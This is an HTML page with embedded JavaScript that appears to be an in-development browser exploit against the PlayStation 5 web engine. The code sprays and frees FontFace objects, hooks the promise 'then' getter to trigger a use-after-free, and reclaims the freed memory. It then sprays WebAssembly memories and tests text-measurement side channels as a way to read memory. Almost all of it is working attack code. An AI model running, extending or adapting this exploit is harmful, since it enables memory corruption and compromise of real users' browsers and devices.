<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 v26 - Metrics Oracle</title>
<style id="s">
@font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
@font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
*{margin:0;padding:0;box-sizing:border-box}
html,body{width:100%;height:100%;background:#0a0a0a;color:#00ff41;
font-family:'MS Gothic','Courier New',monospace;overflow:hidden}
body::after{content:'';position:fixed;top:0;left:0;right:0;bottom:0;
background:repeating-linear-gradient(0deg,rgba(0,0,0,0.12) 0px,rgba(0,0,0,0.12) 1px,transparent 1px,transparent 3px);
pointer-events:none;z-index:9999}
#hd{position:fixed;top:0;left:0;right:0;height:44px;
background:linear-gradient(180deg,#0d0d0d,#080808);
border-bottom:1px solid #00ff41;display:flex;align-items:center;
padding:0 16px;gap:14px;z-index:10;font-size:12px}
.l{color:#00ff41;letter-spacing:2px;font-weight:bold}
.s{color:#004d13}.v{color:#00cc33}.v b{color:#00ff41}
#pg{position:fixed;top:44px;left:0;right:0;height:2px;background:#001a06;z-index:10}
#pg div{height:100%;background:#00ff41;transition:width .4s;box-shadow:0 0 8px #00ff41}
#out{position:fixed;top:46px;left:0;right:0;bottom:0;
padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
-webkit-user-select:text}
#out::-webkit-scrollbar{width:5px}
#out::-webkit-scrollbar-track{background:#001a06}
#out::-webkit-scrollbar-thumb{background:#004d13;border-radius:3px}
.ok{color:#00ff41}.er{color:#ff3333}.wr{color:#ffcc00}.hl{color:#00ffff;font-weight:bold}
.mg{color:#ff00ff;font-weight:bold;font-size:15px}.dm{color:#006622}
.hd{color:#00ff41;font-weight:bold;font-size:14px;letter-spacing:1px}
.cv{position:absolute;left:-9999px;top:-9999px}
</style>
</head>
<body>
<div id="hd">
<span class="l">▶ v26 METRICS</span><span class="s">│</span>
<span class="v" id="h1">FW:<b>?</b></span><span class="s">│</span>
<span class="v" id="h2">UAF:<b>?</b></span><span class="s">│</span>
<span class="v" id="h3">RC:<b>?</b></span><span class="s">│</span>
<span class="v" id="h4">METRICS:<b>?</b></span>
</div>
<div id="pg"><div id="bar" style="width:0%"></div></div>
<div id="out"></div>
<canvas id="cv" width="512" height="128" class="cv"></canvas>
<script>
"use strict";

var O=document.getElementById("out");
var bar=document.getElementById("bar");
function pg(p){bar.style.width=p+"%"}
function hu(id,v){var e=document.getElementById(id);if(e)e.innerHTML=v}
function P(m,c){var s=document.createElement("span");if(c)s.className=c;
s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight;
try{console.log("[v26] "+m)}catch(e){}}
function Ok(m){P("  ✅ "+m,"ok")}function Fl(m){P("  ✘ "+m,"er")}
function Hi(m){P("  ► "+m,"hl")}function St(m){P("  ★ "+m+" ★","mg")}
function Dm(m){P("  "+m,"dm")}function Wr(m){P("  ⚠ "+m,"wr")}
function Hd(m){P("▸ "+m,"hd")}function Sep(){P("─".repeat(42),"dm")}

window.onerror=function(m,s,l){Fl("FATAL: "+m.substring(0,60)+" @"+l);return true};

var keep=[],holes=[],rcs=[];
var trigger=null,rcFace=null,rcIdx=-1,uafOk=false;
var xRuleIdx=-1,xRule=null;
var ctx=document.getElementById("cv").getContext("2d");

var FB="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
var FBb=(function(){var s=atob(FB),b=new Uint8Array(s.length);
for(var i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b})();
function mkBuf(){var c=new Uint8Array(FBb.length);c.set(FBb);return c.buffer}
function fs(){try{void document.body.offsetTop}catch(e){}}

// UAF Setup
for(var i=0;i<4096;i++){try{var f=new FontFace("h_"+i,mkBuf(),{
unicodeRange:"U+E1"+(i%16).toString(16),style:i%2===0?"normal":"italic",
weight:String(100+(i%9)*100)});document.fonts.add(f);holes.push(f)}catch(e){}}
fs();for(var i=1;i<holes.length;i+=2)try{document.fonts.delete(holes[i])}catch(e){}
fs();
trigger=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
document.fonts.add(trigger);void trigger.loaded;
var sh=document.getElementById("s").sheet;
for(var i=0;i<48;i++)try{sh.insertRule("@font-face{font-family:pad"+i+";src:url(np"+i+".woff);unicode-range:U+E000}",sh.cssRules.length)}catch(e){}
fs();
var fst=document.createElement("style");fst.id="flush";document.head.appendChild(fst);
var fsh=fst.sheet;
for(var i=0;i<768;i++)try{fsh.insertRule("@font-face{font-family:fl"+i+";src:url(nf"+i+".woff);unicode-range:U+E000}",fsh.cssRules.length)}catch(e){}
fs();

Object.defineProperty(FontFace.prototype,"then",{configurable:true,
get:function(){if(this===trigger&&!uafOk){uafOk=true;hu("h2","UAF:<b>✅</b>");
try{var ck=new FontFace("ck","local(Helvetica)",{unicodeRange:"U+E124"});
document.fonts.add(ck);keep.push(ck);sh.deleteRule(1);fs();
while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
fs();for(var i=0;i<holes.length;i+=4)try{document.fonts.delete(holes[i])}catch(e){}
fs()}catch(e){}
for(var i=0;i<4096;i++){try{var f=new FontFace("RC_"+i,mkBuf(),{
unicodeRange:"U+0041",style:"italic",weight:"900",display:"block"});
document.fonts.add(f);rcs.push(f)}catch(e){}}
fs();try{var d=document.createElement("div");d.textContent="AB";
d.style.cssText="position:absolute;left:-9999px;font:64px trigger;";
document.body.appendChild(d);void d.offsetWidth}catch(e){}
}return undefined}});

var rn=0;var raf=function(){rn++;
if(!uafOk&&rn>=5){try{if(sh&&sh.cssRules.length>1){sh.deleteRule(1);fs()}
while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
for(var i=0;i<4096;i++){try{var f=new FontFace("RC_"+i,mkBuf(),{
unicodeRange:"U+0041",style:"italic",weight:"900"});
document.fonts.add(f);rcs.push(f)}catch(e){}}fs()}catch(e){}}
if(rn<20)requestAnimationFrame(raf)};requestAnimationFrame(raf);

// Helper: Measure ALL TextMetrics
function measureAll(fontSpec, text) {
try {
ctx.font = fontSpec;
var m = ctx.measureText(text);
return {
width: m.width,
actualBoundingBoxAscent: m.actualBoundingBoxAscent,
actualBoundingBoxDescent: m.actualBoundingBoxDescent,
actualBoundingBoxLeft: m.actualBoundingBoxLeft,
actualBoundingBoxRight: m.actualBoundingBoxRight,
fontBoundingBoxAscent: m.fontBoundingBoxAscent,
fontBoundingBoxDescent: m.fontBoundingBoxDescent
};
} catch(e) {
return {error: e.message};
}
}

// Helper: Create font with modified bytes at specific offset
function makeFontModified(offset, value) {
var buf = new ArrayBuffer(FBb.length);
var src = new Uint8Array(buf);
src.set(FBb);
var view = new DataView(buf);
if (offset + 2 <= buf.byteLength) {
view.setUint16(offset, value & 0xFFFF, true);
}
return buf;
}

// Capture
document.fonts.load("1em trigger, x","AB").then(function(faces){
for(var i=0;i<faces.length;i++){
var f=faces[i];
if(f.family&&f.family.indexOf("RC_")===0){rcFace=f;var m=f.family.match(/RC_(\d+)/);if(m)rcIdx=parseInt(m[1])}
}
keep.push(faces);keep.push(rcFace);
if(!rcFace){Fl("No RC");return}
Ok("RC_"+rcIdx+" captured");
hu("h3","RC:<b>"+rcIdx+"</b>");
var ua=navigator.userAgent||"";var m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
hu("h1","FW:<b>"+(m?m[1]:"?")+"</b>");

// Add CSSRule for "x"
xRuleIdx=sh.insertRule(
"@font-face{font-family:x;src:local(Courier);font-weight:400;font-style:normal;unicode-range:U+0042}",
sh.cssRules.length);
fs();
xRule=sh.cssRules[xRuleIdx];
Ok("CSSRule for 'x' ready");

// ============================================================
//  PHASE 1: Baseline TextMetrics
// ============================================================
pg(10);Sep();Hd("PHASE 1: Baseline TextMetrics");Sep();

var baseline = measureAll("64px x", "BBBB");
P("  Baseline metrics for '64px x' on 'BBBB':","dm");
for (var key in baseline) {
P("    " + key.padEnd(32) + " = " + baseline[key],
typeof baseline[key] === "number" && baseline[key] !== 0 ? "hl" : "dm");
}

// Compare with known fonts
P("");
P("  Comparison with known fonts:","dm");
var knownFonts = ["Helvetica", "Courier", "Arial", "serif", "monospace"];
for (var fi=0; fi<knownFonts.length; fi++) {
var km = measureAll("64px " + knownFonts[fi], "BBBB");
P("    " + knownFonts[fi].padEnd(12) + " width=" + km.width +
" asc=" + (km.actualBoundingBoxAscent||0) +
" desc=" + (km.actualBoundingBoxDescent||0),
km.width !== baseline.width ? "hl" : "dm");
}

// ============================================================
//  PHASE 2: Change RC face font data → re-measure
// ============================================================
pg(25);Sep();Hd("PHASE 2: Font Data → Metrics");Sep();

P("  Testing if changing font data changes metrics...","dm");
P("");

// Test: modify different byte offsets in the font
var offsets = [0, 4, 8, 16, 32, 64, 128, 256, 512];
var widthResults = [];

for (var oi=0; oi<offsets.length; oi++) {
var off = offsets[oi];
try {
// Create modified font
var modBuf = makeFontModified(off, 0xFFFF);

// Delete old RC, create new with modified data
document.fonts.delete(rcFace);
var newRC = new FontFace("RC_" + rcIdx, modBuf, {
unicodeRange: "U+0041", style: "italic", weight: "900", display: "block"
});
document.fonts.add(newRC);
fs();
keep.push(newRC);
rcFace = newRC;

// Measure
var m = measureAll("64px x", "B");
widthResults.push({offset: off, width: m.width});
P("  off=" + String(off).padStart(4) +
" → width=" + m.width.toFixed(2) +
" asc=" + (m.actualBoundingBoxAscent||0).toFixed(2) +
" desc=" + (m.actualBoundingBoxDescent||0).toFixed(2),
m.width !== baseline.width ? "hl" : "dm");

} catch(e) {
P("  off=" + off + " → ERR: " + e.message.substring(0,30), "er");
}
}

// Check if any metrics changed
var widthsChanged = false;
for (var i=1; i<widthResults.length; i++) {
if (widthResults[i].width !== widthResults[0].width) {
widthsChanged = true;
break;
}
}

if (widthsChanged) {
St("METRICS CHANGE WITH FONT DATA!");
Hi("Font data → metrics side channel found!");
} else {
Wr("Metrics did NOT change with font data");
}

// ============================================================
//  PHASE 3: Direct "x" measurement with different chars
// ============================================================
pg(40);Sep();Hd("PHASE 3: Character Variation");Sep();

// Restore original RC
try {
document.fonts.delete(rcFace);
var origRC = new FontFace("RC_" + rcIdx, mkBuf(), {
unicodeRange: "U+0041", style: "italic", weight: "900", display: "block"
});
document.fonts.add(origRC);
fs();
keep.push(origRC);
rcFace = origRC;
} catch(e) {}

P("  Measuring different characters with '64px x':","dm");
P("");

var testChars = [
{ch: "B", code: "U+0042"},
{ch: "A", code: "U+0041"},
{ch: "C", code: "U+0043"},
{ch: "W", code: "U+0057"},
{ch: "M", code: "U+004D"},
{ch: "i", code: "U+0069"},
{ch: "0", code: "U+0030"},
{ch: "\u00C0", code: "U+00C0"}
];

for (var ci=0; ci<testChars.length; ci++) {
var tc = testChars[ci];
var m = measureAll("64px x", tc.ch);
P("  " + tc.code + " '" + tc.ch + "' → width=" + m.width.toFixed(2) +
" asc=" + (m.actualBoundingBoxAscent||0).toFixed(2) +
" desc=" + (m.actualBoundingBoxDescent||0).toFixed(2),
m.width > 0 ? "hl" : "dm");
}

// ============================================================
//  PHASE 4: WASM Gigacage Spray
// ============================================================
pg(55);Sep();Hd("PHASE 4: WASM Gigacage Spray");Sep();

P("  Setting up WASM memories...","dm");
var wasmMemories = [];

try {
var wasmCode = new Uint8Array([
0x00,0x61,0x73,0x6D, 0x01,0x00,0x00,0x00,
0x05,0x03,0x01,0x00,0x01,
0x07,0x08,0x01, 0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00
]);

var wasmModule = new WebAssembly.Module(wasmCode);

for (var i=0; i<32; i++) {
var inst = new WebAssembly.Instance(wasmModule);
var mem = inst.exports.memory;
var view = new DataView(mem.buffer);

// Write marker pattern
view.setUint32(0, 0xDEAD0000 | i, true);
view.setUint32(4, 0xCAFEBABE, true);

// Write fake hmtx data
view.setUint16(0x100, 5000 + i, true);
view.setUint16(0x104, 3000 + i, true);

// Write fake head data
view.setUint32(0x200, 0x00010000, false);
view.setUint16(0x212, 1000 + i, false);
view.setUint16(0x224, 500 + i, false);
view.setUint16(0x226, 700 + i, false);

wasmMemories.push({mem: mem, view: view, index: i});
}

Ok("32 WASM memories allocated");
P("  Total: " + (wasmMemories.length * 64) + "KB","dm");

// Re-measure after WASM spray
P("");
P("  Re-measuring '64px x' after WASM spray:","dm");
var beforeWasm = measureAll("64px x", "B");

// We need to trigger font reload to pick up WASM data
// Delete and re-add RC face
try {
document.fonts.delete(rcFace);
var wasmRC = new FontFace("RC_" + rcIdx, mkBuf(), {
unicodeRange: "U+0041", style: "italic", weight: "900", display: "block"
});
document.fonts.add(wasmRC);
fs();
keep.push(wasmRC);
rcFace = wasmRC;
} catch(e) {}

var afterWasm = measureAll("64px x", "B");
P("  Before WASM: width=" + beforeWasm.width.toFixed(2) +
" asc=" + (beforeWasm.actualBoundingBoxAscent||0).toFixed(2),
"dm");
P("  After WASM:  width=" + afterWasm.width.toFixed(2) +
" asc=" + (afterWasm.actualBoundingBoxAscent||0).toFixed(2),
Math.abs(afterWasm.width - beforeWasm.width) > 0.01 ? "hl" : "dm");

if (Math.abs(afterWasm.width - beforeWasm.width) > 0.01) {
St("METRICS CHANGED AFTER WASM SPRAY!");
Hi("Font data may overlap with WASM memory!");
}

} catch(e) {
Fl("WASM: " + e.message);
}

// ============================================================
//  PHASE 5: unitsPerEm variation
// ============================================================
pg(70);Sep();Hd("PHASE 5: unitsPerEm Variation");Sep();

P("  Testing unitsPerEm changes...","dm");
P("");

// Modify font at various offsets to find head table
var upemOffsets = [];
for (var off=0; off<FBb.length-2; off++) {
// Look for potential unitsPerEm field (typically 1000 or 2048)
if (FBb[off] === 0x03 && FBb[off+1] === 0xE8) { // 1000
upemOffsets.push(off);
}
}

P("  Found " + upemOffsets.length + " potential unitsPerEm locations (value=1000)","dm");

// Try modifying each
for (var ui=0; ui<Math.min(upemOffsets.length, 5); ui++) {
var upemOff = upemOffsets[ui];
try {
var modBuf = new ArrayBuffer(FBb.length);
var src = new Uint8Array(modBuf);
src.set(FBb);
var view = new DataView(modBuf);

// Change unitsPerEm from 1000 to 8000
view.setUint16(upemOff, 8000, false);

document.fonts.delete(rcFace);
var upemRC = new FontFace("RC_" + rcIdx, modBuf, {
unicodeRange: "U+0041", style: "italic", weight: "900", display: "block"
});
document.fonts.add(upemRC);
fs();
keep.push(upemRC);
rcFace = upemRC;

var m = measureAll("64px x", "B");
P("  upemOff=" + String(upemOff).padStart(4) + " → width=" + m.width.toFixed(2) +
" asc=" + (m.actualBoundingBoxAscent||0).toFixed(2) +
" desc=" + (m.actualBoundingBoxDescent||0).toFixed(2),
"dm");

} catch(e) {
P("  upemOff=" + upemOff + " → ERR","er");
}
}

// ============================================================
//  PHASE 6: DOM offsetWidth Oracle
// ============================================================
pg(80);Sep();Hd("PHASE 6: DOM offsetWidth Oracle");Sep();

P("  Testing DOM element width...","dm");
P("");

var domTests = [
{font: "64px x", text: "B"},
{font: "64px trigger", text: "A"},
{font: "64px Helvetica", text: "B"},
{font: "64px Courier", text: "B"},
{font: "900 italic 64px x", text: "B"},
{font: "100 normal 64px x", text: "B"}
];

for (var di=0; di<domTests.length; di++) {
var t = domTests[di];
try {
var d = document.createElement("div");
d.textContent = t.text;
d.style.cssText = "position:absolute;left:-9999px;font:" + t.font + ";";
document.body.appendChild(d);
var w = d.offsetWidth;
var h = d.offsetHeight;
P("  " + t.font.padEnd(28) + " '" + t.text + "' → w=" + w + " h=" + h,
w > 0 ? "hl" : "dm");
document.body.removeChild(d);
} catch(e) {
P("  " + t.font + " → ERR","er");
}
}

// ============================================================
//  PHASE 7: unicode-range Oracle
// ============================================================
pg(90);Sep();Hd("PHASE 7: unicode-range Oracle");Sep();

P("  Testing unicode-range per codepoint...","dm");
P("");

var rangeTests = [
{range: "U+0041", char: "A", name: "U+0041"},
{range: "U+0042", char: "B", name: "U+0042"},
{range: "U+0043", char: "C", name: "U+0043"},
{range: "U+0061", char: "a", name: "U+0061"},
{range: "U+0030", char: "0", name: "U+0030"},
{range: "U+E000", char: "\uE000", name: "U+E000"}
];

// We'll use synchronous check() for this
for (var ri=0; ri<rangeTests.length; ri++) {
var rt = rangeTests[ri];
try {
xRule.style.unicodeRange = rt.range;
xRule.style.fontWeight = "400";
fs();

// Use check() as oracle
var chk = document.fonts.check("64px x", rt.char);

// Also measure
ctx.font = "64px x";
var w = ctx.measureText(rt.char).width;

P("  " + rt.name.padEnd(10) + " char='" + rt.char + "' → check=" + chk +
" width=" + w.toFixed(2),
chk ? "hl" : "dm");
} catch(e) {
P("  " + rt.name + " → ERR: " + e.message.substring(0,30),"er");
}
}

// Restore
try { xRule.style.unicodeRange = "U+0042"; fs(); } catch(e) {}

// ============================================================
//  SUMMARY
// ============================================================
pg(100);Sep();Hd("FINAL SUMMARY");Sep();
P("");
P("  UAF:                  ✅");
P("  RC captured:          RC_" + rcIdx);
P("  CSSRule for 'x':      ✅");
P("  TextMetrics measured: ✅");
P("  Font data variation:  " + (widthsChanged ? "✅ CHANGED!" : "❌ no change"));
P("  WASM spray:           " + (wasmMemories.length > 0 ? wasmMemories.length + " memories" : "failed"));
P("  DOM offsetWidth:      Tested");
P("  unicode-range oracle: Tested");
P("");

if (widthsChanged) {
St("FONT DATA → METRICS SIDE CHANNEL!");
P("  Next: encode addresses in font tables","hl");
P("  Read back via measureText() = memory read!","hl");
hu("h4","METRICS:<b>READ!</b>");
} else {
P("  Metrics did NOT change with font data.","wr");
P("  Browser uses fallback for metrics.","dm");
hu("h4","METRICS:<b>FALLBACK</b>");
}

}).catch(function(e){Fl("Load: "+e.message)});
</script>
</body>
</html>
